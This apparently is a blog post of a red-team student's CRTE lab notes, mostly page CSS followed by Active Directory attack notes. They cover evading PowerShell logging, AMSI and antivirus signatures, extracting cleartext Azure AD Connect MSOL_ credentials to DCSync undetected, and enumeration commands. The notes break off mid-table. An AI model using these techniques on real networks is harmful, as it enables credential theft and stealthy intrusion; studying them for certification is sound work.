---
layout: post
title:  CRTE Notes
description: Notes I wrote while studying for the CRTE course and fully compromising the lab.
date:   2023-06-12
image: '/images/CRTE.jpeg'
tags:   [Active Directory, AD, Notes, Red Team, Certification]
---

<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CRTE Notes</title>
<style>
.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-interactiveBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head>
The PDF version of these notes can be found <a href="https://0xd4y.com/misc/CRTE_Notes.pdf">here.</a>
<body><article id="d90ebe33-f677-4189-b29f-11b6f3b0175b" class="page sans"><header><img class="page-cover-image" src="../../../../images/images/CRTE%20Notes%20d90ebe33f6774189b29f11b6f3b0175b/Notes_Cover.png" style="object-position:center 50%"/><h1 class="page-title">CRTE Notes</h1><p class="page-description"></p></header><div class="page-body"><p id="ae7bcb37-98e6-4777-a422-8661b0502a59" class="">These notes are a continuation of <a href="https://0xd4y.com/2023/04/05/CRTP-Notes/">CRTP (Certified Red Team Professional) Notes</a>.</p><h1 id="9b93b164-0fc9-466c-9b77-b2f4c6c08f5a" class="">Table of Contents</h1><nav id="5d4609a4-22ad-4c3c-93dd-7969e8c532bf" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#9b93b164-0fc9-466c-9b77-b2f4c6c08f5a">Table of Contents</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#43907831-5fc4-45c1-a309-6cff7721b18b">PowerShell Bypasses</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#4b2c40ff-5351-4f81-8904-3da80c038ad3">InvisiShell</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b2534cab-fe57-4653-bbfb-331b6fbb81be">AV Signature Bypass</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#309f811e-a498-4d3a-977d-474fdeadc958">Azure AD</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5de228c4-1f0a-4636-9c1d-0bfb284a26b4">Attacking PHS</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#100a8d3f-f990-4c6b-8ebc-cf440d58b62b">Enumeration</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#68475ba6-10c5-440e-af1d-9ec37a1d8a0c">General</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#23670dda-f11d-4657-84f0-87787ad393a6">AppLocker, WDAC, and Tamper Protection</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c473bea6-31cf-4859-a028-284c532314b8">Misc</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#f7cfa0fe-bda5-4142-ba01-0386dc4d702c">Domain Privilege Escalation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#62a12a95-c900-4d92-8223-670ab66f5d36">LAPS</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5415e9fa-3a44-410a-8773-1d9de47430db">gMSA</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#aa311353-00a9-42d3-9124-97f62b330bce">Golden gMSA</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#f70b5b45-3f35-42ac-9bd2-d0a2cdc7a0f8">Constrained Delegation - Kerberos Only</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#d84860b9-5724-418f-bc21-897ab1e6cc63">GenericWrite on Computer</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#23468e89-60b6-4666-a8dc-d0d260610435">Shadow Credentials</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#44b5eed6-d9d8-4df4-95bd-a23d90a6c377">Certificate Service</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e04da89e-a870-42a5-b074-a91852c13b45">Misc</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#6ae3b70d-edaa-446f-9149-a7a6c49f2b63">Cross-Forest Attacks and Privescs</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5b0bc274-859d-49c6-8426-318cf972c4d9">Kerberoast</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5d9fcabd-a188-4e91-a9b7-d7f31839f54c">Constrained Delegation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ad0dc1d3-8a7e-4f27-826d-2ae8ba3e634a">Unconstrained Delegation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#76f8677a-42ed-4546-8817-7e74651b8a09">Trust Key</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#836f5af0-5e19-4c95-9c67-fda797cafe73">Foreign Security Principal (FSP)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#f7d36b56-2c96-4cef-8dfa-44685a618f35">ACLs</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#7ca7cb2b-f11c-41e6-96d5-cff68c9423c3">PAM Trust</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#46ddd562-8adb-41a4-a62c-188b19c53633">MSSQL</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#aea80314-f25c-4923-8339-13c4fd3de701">Getting Shell on SQL Instance</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#da26d21c-7aad-4be4-86e1-00a8089d09b7">User Impersonation</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#d50bb2c3-f4c6-495f-b132-f51fe983632b">Offensive .NET</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#938c3f5d-5c1f-4705-9891-eefdf05a985d">Best Practices</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ebc6f854-cad0-44e3-8494-fdd3e150b1c5">Privileged Administrative Workstation (PAWs)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6325babd-768e-44b6-a998-b389c899aef8">Just Enough Administration (JEA)</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#605554b9-0c4f-4f2e-933f-d3f675d52357">Tools</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#c8142763-5b42-4526-afb4-875e4d0662de">References</a></div></nav><p id="78422b9a-6ec6-4db5-a1ae-ae28c562ad9d" class="">This course is made for assumed breach scenarios.</p><figure id="a94579f5-86f1-49e7-87d6-6fe2983bd343" class="image"><a href="../../../../images/CRTE%20Notes%20d90ebe33f6774189b29f11b6f3b0175b/Untitled.png"><img style="width:480px" src="../../../../images/CRTE%20Notes%20d90ebe33f6774189b29f11b6f3b0175b/Untitled.png"/></a></figure><h1 id="43907831-5fc4-45c1-a309-6cff7721b18b" class="">PowerShell Bypasses</h1><h2 id="4b2c40ff-5351-4f81-8904-3da80c038ad3" class="">InvisiShell</h2><ul id="613f1f95-fe13-4b86-bf3d-f3d7c5fe01fc" class="bulleted-list"><li style="list-style-type:disc">InvisiShell bypasses system-wide transcription, PowerShell AMSI, and script-block logging </li></ul><ul id="353ee1dc-d099-4a93-99b3-0f07cf5064d3" class="bulleted-list"><li style="list-style-type:disc">use <code>RunWithRegistryNonAdmin.bat</code> instead of <code>RunWithPathAsAdmin.bat</code><ul id="6a0aff77-22a8-4e93-9b2d-ae2199f5bfbb" class="bulleted-list"><li style="list-style-type:circle">modifies HKCU which is less detected than HKLM</li></ul></li></ul><ul id="15d4d3da-86d7-4901-b744-57067964bc0f" class="bulleted-list"><li style="list-style-type:disc"><code>RunWithPathAsAdmin.bat</code> modifies HKLM<ul id="3b9be1af-69e5-44be-a085-181a8ab08e94" class="bulleted-list"><li style="list-style-type:circle">heavy detection on HKLM-based keys</li></ul></li></ul><ul id="1ea94967-51e7-4ac7-b14a-20cc6cd27b6f" class="bulleted-list"><li style="list-style-type:disc">run <code>exit</code> command when you are done to clean up</li></ul><h2 id="b2534cab-fe57-4653-bbfb-331b6fbb81be" class="">AV Signature Bypass</h2><ul id="2425c3e7-6c70-4b06-b5db-aaaa426deb68" class="bulleted-list"><li style="list-style-type:disc">use <a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger </a>to identify what in your script is triggering AMSI<ul id="7b47ccdf-e7f5-4ae0-8e28-28251aaa5b16" class="bulleted-list"><li style="list-style-type:circle"><code>AmsiTrigger_x64.exe -i C:\PATH\TO\script.ps1</code></li></ul></li></ul><ul id="2ac435df-9448-4d07-a29e-3a6600630f96" class="bulleted-list"><li style="list-style-type:disc">use <a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a> to identify what is triggering Defender<ul id="615048ed-7777-4ba8-9916-26df7d08cd62" class="bulleted-list"><li style="list-style-type:circle"><code>DefenderCheck.exe C:\PATH\TO\script.ps1</code></li></ul></li></ul><ul id="c9b2c5e5-b3f9-4fe4-a036-05ea1e2b98d0" class="bulleted-list"><li style="list-style-type:disc">use <a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation </a>for obfuscating scripts </li></ul><ul id="698b7815-8da0-4a2f-96a4-cb7caf12d8d7" class="bulleted-list"><li style="list-style-type:disc">minimize obfuscation and focus more on signature detection, modifying detected malicious code, string manipulation, etc.<ul id="7d2e6ee9-e1e7-441f-84c2-aa8334710265" class="bulleted-list"><li style="list-style-type:circle">the more a binary is obfuscated, the more suspicious it looks</li></ul></li></ul><h1 id="309f811e-a498-4d3a-977d-474fdeadc958" class="">Azure AD</h1><p id="07ce9fb1-079b-4e4f-94ef-9b3c8ed9dc4d" class="">Can be integrated with on-prem AD using AD connect using one of the methods:</p><ol type="1" id="9bbe8c99-fb04-43c3-9e7f-c6b73f96a538" class="numbered-list" start="1"><li>Password Hash Sync (PHS)<ul id="de779403-800b-4b68-a34c-8d1ed750f149" class="bulleted-list"><li style="list-style-type:disc">all creds of on-prem is hashed and synced with Azure AD</li></ul></li></ol><ol type="1" id="8ee4f9c9-d302-4b77-9780-f7bfa70e279f" class="numbered-list" start="2"><li>Pass-Through Authentication (PTA)<ul id="4d20dbbc-65c9-4943-a787-57c9cc7a05d3" class="bulleted-list"><li style="list-style-type:disc">Azure AD forwards creds to on-prem AD<ul id="d4509f2f-dd79-416c-a342-7cb6cb597b2c" class="bulleted-list"><li style="list-style-type:circle">on-prem checks if cred is valid or not, this result is returned to Azure AD, and Azure AD either allows user to access Azure resources or not</li></ul></li></ul></li></ol><ol type="1" id="e17d230c-2624-4ce8-8af3-e8cc4dcb1af1" class="numbered-list" start="3"><li>Federation<ul id="7164ebe9-30e8-4bc5-8a5d-cd4a40694bed" class="bulleted-list"><li style="list-style-type:disc">SAML based auth worklow</li></ul></li></ol><ul id="f53cfcef-5ba6-4747-9c58-da84338fc1e4" class="bulleted-list"><li style="list-style-type:disc">contains high-privileged account called <code>MSOL_&lt;RANDOM_ID&gt;</code> that performs a DCSync every two minutes<ul id="14ef138d-510f-47b5-b8c2-6b63736ad89f" class="bulleted-list"><li style="list-style-type:circle">creds for this account stored in clear-text</li></ul></li></ul><h2 id="5de228c4-1f0a-4636-9c1d-0bfb284a26b4" class="">Attacking PHS</h2><ul id="75d39367-4c0a-4bf5-bf2f-02abcc5bda7c" class="bulleted-list"><li style="list-style-type:disc">will not get detected by MDI if you DCSync using the MSOL_ user, as this user is typically on the exclusion list of MDI due to its frequent DCSync</li></ul><p id="57e75900-4a82-43d6-a27b-a71144efdbca" class=""><strong>Get User and Extract Creds</strong></p><pre id="8c98b032-3b51-48fb-b092-2805f2c1205c" class="code"><code># PowerView
Get-DomainUser -Identity &quot;MSOL_*&quot; -Domain 0xd4y.local 

# AD Module
Get-ADUser -Filter &quot;samAccountName -like &#x27;MSOL_*&#x27;&quot; -Server 0xd4y.local -Properties * | select SamAccountName,Description | fl

# Source ADConnect PS Script
. .\adconnect.ps1

# Extract creds of MSOL_&lt;ID&gt; user
ADConnect

# Run CMD instance as MSOL_&lt;ID&gt; user
runas /user:0xd4y.local\MSOL_&lt;ID&gt; /netonly cmd</code></pre><ul id="9ee3d7f8-9203-488c-941f-0a340cf97fb3" class="bulleted-list"><li style="list-style-type:disc">note <code>adconnect.ps1</code> runs <code>powershell.exe</code> , so verbose logs are present<ul id="ebb7caf8-eb83-406f-8859-ceada8c3a78c" class="bulleted-list"><li style="list-style-type:circle">ensure to modify this script’s code and run within <code>Invisi-Shell</code> to potentially bypass these logs</li></ul></li></ul><h1 id="100a8d3f-f990-4c6b-8ebc-cf440d58b62b" class="">Enumeration</h1><h2 id="68475ba6-10c5-440e-af1d-9ec37a1d8a0c" class="">General</h2><ul id="b27de70c-9d59-4f1b-9e2b-6bc7700dd572" class="bulleted-list"><li style="list-style-type:disc">recommended to use AD PowerShell Module <ul id="18e9e79e-fc4c-4e3e-ac34-a8c13dd72cae" class="bulleted-list"><li style="list-style-type:circle">signed by MS and therefore works in CLM</li></ul><ul id="73ee9f96-eeb8-4560-9634-2ab111611f46" class="bulleted-list"><li style="list-style-type:circle">less suspicious</li></ul></li></ul><ul id="cf8394ac-e3f9-4652-9fa8-e7c00da337aa" class="bulleted-list"><li style="list-style-type:disc">can use SharpView (PowerView written in C#)<ul id="acb0143c-ed39-412b-b9a1-c5ae173ae008" class="bulleted-list"><li style="list-style-type:circle">cannot use pipes</li></ul></li></ul><table id="542d4131-d508-4ad6-a40a-4d886a6df9c9" class="simple-table"><tbody><tr id="d81e4df5-d6d3-4f72-b165-d626606df7fa"><td id="\wCX" class="" style="width:260px"><strong>Command</strong></td><td id="~Bof" class="" style="width:453.00000762939453px"><strong>Description</strong></td></tr><tr id="ac69bfc4-e5b5-4840-a1f4-346301fb6cdf"><td id="\wCX" class="" style="width:260px"><code>(Get-DomainPolicyData).systemaccess</code></td><td id="~Bof" class="" style="width:453.00000762939453px">Use to get policy for tickets</td></tr><tr id="dd4bf8f7-4e1a-4ace-b2a4-6fccfd0390fa"><td id="\wCX" class="" style="width:260px"><code>Get-DomainGPOComputerLocalGroupMapping</code></td><td id="~Bof" class="" style="width:453.00000762939453px">Get users that are in a local group for specified machine (use <code>-Identity</code> to specify machine)</td></tr><tr id="0843ebc3-a517-47fe-8f26-86196a173aa7"><td id="\wCX" class="" style="width:260px"><code>Get-DomainObjectACL -ResolveGUIDs</code></td><td id="~Bof" class="" style="width:453.00000762939453px">Enumerate ACL for specific object</td></tr><tr id="d68b221b-f6b0-4850-ba87-0156da743735"><td id="\wCX" class="" style="width:260px"><code>Get-ADGroup -Filter * -searchbase &quot;OU=Mgmt,DC=us,DC=techcorp,DC=local&quot; -Properties *</code></td><td id="~Bof" class="" style="width:453.00000762939453px">Get members in group in a specific OU</td></tr><tr id="f499d009-2f33-4418-8105-79f3c4eba0cd"><td id="\wCX" class="" style="width:260px"><code>net view \\some_server.local</code></td><td id="~Bof" class="" style="width:453.00000762939453px">Enumerate shares on some_server</td></tr><tr id="2fb16d4a-c8ad-49d5-b2d8-dcc21901c3d6"><td id="\wCX" class="" style="width:260px"><code>(Get-ADForest).Domains| %{Get-ADDomain -Server $_}|select name, domainsid</code></td><td id="~Bof" class="" style="width:453.00000762939453px">Get SID of all child forests and root forest in current forest</td></tr><tr id="c7344909-51fc-486c-afc4-10866cad1854"><td id="\wCX" class="" style="width:260px"><code>Get-DnsServerZone -ZoneName some_forest.local |fl *</code></td><td id="~Bof" class="" style="width:453.00000762939453px">Get IP addresses of DCs in target (note you can also ping the DCs to find the IP if you already know the DC names)</td></tr><tr id="8941c851-11f5-4df9-bd64-a1151edab910"><td id="\wCX" class="" 